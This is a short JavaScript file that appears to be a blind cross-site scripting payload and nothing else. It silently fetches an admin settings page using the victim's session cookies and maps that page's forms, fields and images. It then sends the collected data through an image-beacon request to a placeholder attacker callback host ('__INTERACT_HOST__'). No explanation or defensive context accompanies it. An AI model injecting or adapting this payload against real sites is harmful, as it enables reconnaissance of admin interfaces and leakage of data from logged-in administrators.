(() => {
  if (window.__WINDOW_GUARD__) return;
  window.__WINDOW_GUARD__ = true;

  fetch('/admin/settings.php', { credentials: 'include' })
    .then(async response => {
      const html = await response.text();
      const doc = new DOMParser().parseFromString(html, 'text/html');
      const forms = [...doc.querySelectorAll('form')].map(form => ({
        action: form.getAttribute('action') || '',
        method: (form.getAttribute('method') || 'get').toLowerCase(),
        enctype: form.getAttribute('enctype') || '',
        fields: [...form.querySelectorAll('input,textarea,select')].map(
          field => ({
            name: field.getAttribute('name') || '',
            type: field.getAttribute('type') || field.tagName.toLowerCase()
          })
        )
      }));
      const images = [...doc.querySelectorAll('img')].map(image => ({
        src: image.getAttribute('src') || '',
        alt: image.getAttribute('alt') || ''
      }));
      const result = {
        status: response.status,
        title: doc.title,
        forms,
        images
      };

      new Image().src =
        'http://__INTERACT_HOST__/__CALLBACK__' +
        '?data=' + encodeURIComponent(JSON.stringify(result));
    })
    .catch(() => {
      new Image().src =
        'http://__INTERACT_HOST__/__CALLBACK__?status=ERROR';
    });
})();
